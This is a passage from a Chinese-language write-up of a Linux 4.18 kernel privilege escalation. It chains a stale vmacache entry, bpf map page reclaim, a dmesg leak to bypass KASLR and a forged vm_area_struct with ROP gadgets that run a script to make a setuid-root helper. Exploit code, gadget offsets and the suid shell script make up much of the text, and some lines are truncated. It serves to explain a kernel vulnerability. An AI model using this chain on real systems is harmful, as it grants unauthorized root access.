    }
之后们通过bpf map，将包含着我们主线程vmacache缓存数组中没有flush的vma结构的一整页全部申请出来，这样就可以通过bpf
map去修改还没有flush的vma结构。之后我们触发一个缺页异常，回在主线程中调用我们的这个vma结构中的异常处理程序，从而实现执行流程的劫持。
    struct bpf_map_create_args bpf_arg = {
        .map_type = 2,
        .key_size = 4,
        .value_size = 0x1000,
        .max_entries = 1024
    };
    int bpf_map = syscall(321, 0, (unsigned long)&bpf_arg, sizeof(bpf_arg), 0, 0, 0);
    sendfd(0, bpf_map);
再来看bpf的特性：bpf会将分配的内存清空。这个特性正好帮助我们触发warn_on_once,以此来将信息dump到dmesg中，方便我们读取。  
bpf具体的用法：  
调用syscall(__NR_bpf, BPF_MAP_CREATE, &attr,
sizeof(attr))申请创建一个map，在attr结构体中指定map的类型、大小、最大容量等属性。  
之后通过bpf函数带BPF_MAP_UPDATE_ELEM参数去更新内存的内容。
###  如何绕过kaslr？
如果写入eventfd将会触发usercopy，使R8仍然包含指向eventfd_fops结构的指针
    syscall(1, sync_fd, 0x7fffffffd000, 8, 0, 0, 0);
并且我们通过vmacache_find()去搜索0x7fffffffd000是否在我们的vmacache缓存中。
我们来看4.18的vmacache_find函数  
首先查看vma是否为null，因为我门之前的一系列工作，vma非空。之后warn_on_once,因为我们的bpfmap的申请已经把整页清零，所以这里一定会触发WARN_ON_ONCE(),仅会在第一次触发时打印调试信息，并且继续执行。因此这里的vma仅仅会返回null，并且回到红黑树查找，并不会将系统崩溃。如此，我们可以获得dmesg的各种调试信息。
vma的地址在rax中，mm_struct的地址位于rdi中，同时还有r8中泄漏的eventfd_fops用来绕过kaslr。
    while (1) {
        char *ptr;
        int res = read(kmsg_fd, buf, sizeof(buf)-1);
        if (res  0 && strstr(buf, "---[ end trace"))
            break;
    }
###  rop chain
利用我们之前通过dmesg泄漏的地址，最终我们需要伪造一个vma结构，其中的几个关键点是：vm_start和vm_end,vm_start必须设置0x7fffffffd000或者是随便一块没有被映射的区域，这样我们在解应用这块区域去触发页错误的时候，我们会找到我们伪造的vma。
第二个关键点是vm_ops，我们将会在子进程中调用eventfd来阻塞，直到我们在将fake
vma写入到我们的bpf之后，在阻塞完毕之后，主进程再次阻塞。这个时候我们的子进程解引用一个没有建立页表映射的内存位置，触发缺页异常。因为我们之前已经伪造了vm_start，这个时候我们会触发
__do_fault函数，在其中调用我们伪造的vma的vm_ops的falut函数。  
我们仔细来看伪造的vm_area_struct和payload。
    char kernel_cmd[8] = "/tmp/%1";
    struct vm_area_struct fake_vma = {
        .vm_start = 0x7fffffffd000,
        .vm_end = 0x7fffffffe000,
        .vm_rb = {
            .__rb_parent_color =
                (eventfd_fops-0xd92ce0), //run_cmd: 0xffffffff810b09a0
            .rb_right = vma_kaddr
                + offsetof(struct vm_area_struct, vm_rb.rb_left)
            /*rb_left reserved for kernel_cmd*/
        },
        .vm_mm = mm,
        .vm_flags = VM_WRITE|VM_SHARED,
        .vm_ops = vma_kaddr
            + offsetof(struct vm_area_struct, vm_private_data)
            - offsetof(struct vm_operations_struct, fault),
        .vm_private_data = eventfd_fops-0xd8da5f,
        .shared = {
            .rb_subtree_last = vma_kaddr
                + offsetof(struct vm_area_struct, shared.rb.__rb_parent_color)
                - 0x88,
            .rb = {
                .__rb_parent_color = eventfd_fops-0xd9ebd6
            }
        }
    };
vm_ops的位置是
        .vm_ops = vma_kaddr
            + offsetof(struct vm_area_struct, vm_private_data)
            - offsetof(struct vm_operations_struct, fault),
vma_kaddr的值就是我们通过dmesg获得的已经失效的vma缓存的地址，也就是我们将要通过bpf伪造的vma，这样的话我们调用vm->vm_ops->fault就是等于调用了
vma_kaddr + offsetof(struct vm_area_struct,
vm_private_data)，而这个值在我们伪造的vma中是vm_private_data，我们已经将其伪造成了内核rop：
    ffffffff810b5c21: 49 8b 45 70           mov rax,QWORD PTR [r13+0x70]
    ffffffff810b5c25: 48 8b 80 88 00 00 00  mov rax,QWORD PTR [rax+0x88]
    ffffffff810b5c2c: 48 85 c0              test rax,rax
    ffffffff810b5c2f: 74 08                 je ffffffff810b5c39
    ffffffff810b5c31: 4c 89 ef              mov rdi,r13
    ffffffff810b5c34: e8 c7 d3 b4 00        call ffffffff81c03000 
就是等于是 call
rax，而rax的值是r13+0x88，r13的值就是我们伪造的vma的地址。也就是call vma struct+0x88的位置，
在这个位置是
    .rb = {
                .__rb_parent_color = eventfd_fops-0xd9ebd6
            }
我们放上来另一个内核rop
    ffffffff810a4aaa: 48 89 fb              mov rbx,rdi
    ffffffff810a4aad: 48 8b 43 20           mov rax,QWORD PTR [rbx+0x20]
    ffffffff810a4ab1: 48 8b 7f 28           mov rdi,QWORD PTR [rdi+0x28]
    ffffffff810a4ab5: e8 46 e5 b5 00        call  ffffffff81c03000
这里我们将call
vma+0x20,参数是vma+0x28,我们已经在结构中伪造了将vma+0x20是run_cmd,vma+0x28也就是vm_rb.rb_left的值是”/tmp/%1”  
而这里面我们早就写入了
        char *suid_tmpl = "#!/bin/shn"
                  "chown root:root ./suidhelpern"
                  "chmod 04755 ./suidhelpern"
                  "while true; do sleep 1337; donen";
这样直接给suidhelper以root权限。
之后我们伪造一个fake page，offset的值是
        if (offset + sizeof(fake_vma) 的fault，从而实现整个rop chain
的利用。之后我们的主进程虽然会崩溃掉，但是我们已经以root权限打开了新的可执行文件sulidhelper，在其中弹出一个shell，实现了内核态的提权。
## 参考链接